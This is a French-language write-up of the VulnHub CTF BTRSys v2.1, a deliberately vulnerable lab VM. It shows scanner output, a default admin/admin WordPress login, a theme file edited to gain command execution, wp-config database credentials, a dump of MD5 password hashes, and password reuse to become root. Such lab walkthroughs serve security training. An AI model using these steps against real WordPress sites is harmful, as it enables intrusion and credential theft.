---
title: "Solution du CTF BTRSys: v2 de VulnHub"
tags: [CTF, VulnHub]
---

Le CTF [BTRSys: v2.1](https://vulnhub.com/entry/btrsys-v21,196/) était extrêmement simple et rapide à résoudre. La difficulté majeure était finalement que la VM ne parvenait pas à obtenir une adresse IP. Il fallait donc se rajouter un utilisateur sur le système afin de pouvoir exécuter `dhclient` au démarrage.

Allez, c'est parti !

Pour une fois, on va lancer `Nuclei` dessus qui nous trouve le nécessaire pour ce CTF :

```
[robots-txt] [http] [info] http://192.168.56.180/robots.txt
[options-method] [http] [info] http://192.168.56.180/ [GET,HEAD,POST,OPTIONS]
[robots-txt-endpoint] [http] [info] http://192.168.56.180/robots.txt
[robots-txt-endpoint] [http] [info] http://192.168.56.180/wordpress/
[waf-detect:apachegeneric] [http] [info] http://192.168.56.180/
[ftp-anonymous-login] [tcp] [medium] 192.168.56.180:21
[openssh-detect] [tcp] [info] 192.168.56.180:22 [SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.1]
```

On a donc un Wordpress présent dans `/wordpress` et juste en testant on trouve que les identifiants `admin` / `admin` sont acceptés.

J'édite alors le fichier `404.php` du thème via le `Theme Editor` pour me rajouter une exécution de commande.

Je peux alors fouiller dans le système en commençant par la base de données via la configuration du wordpress :

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'rootpassword!');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```

Les hashes sont stockés en MD5 :

```console
www-data@ubuntu:/var/www/html/wordpress$ mysql -u root -p'rootpassword!' wordpress
mysql: [Warning] Using a password on the command line interface can be insecure.
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 57
Server version: 5.7.17-0ubuntu0.16.04.1 (Ubuntu)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> select * from wp_users;
+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                        | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | root       | a318e4507e5a74604aafb45e4741edd3 | btrisk        | mdemir@btrisk.com |          | 2017-04-24 17:37:04 |                     |           0 | btrisk       |
|  2 | admin      | 21232f297a57a5a743894a0e4a801fc3 | admin         | ikaya@btrisk.com  |          | 2017-04-24 17:37:04 |                     |           4 | admin        |
+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
2 rows in set (0.00 sec)
```

Les mots de passe correspondant sont `admin` et `roottoor`.

Ce dernier correspond au compte local `root` :

```console
www-data@ubuntu:/var/www/html/wordpress$ su root
Password: 
root@ubuntu:/var/www/html/wordpress# id
uid=0(root) gid=0(root) groups=0(root)
```


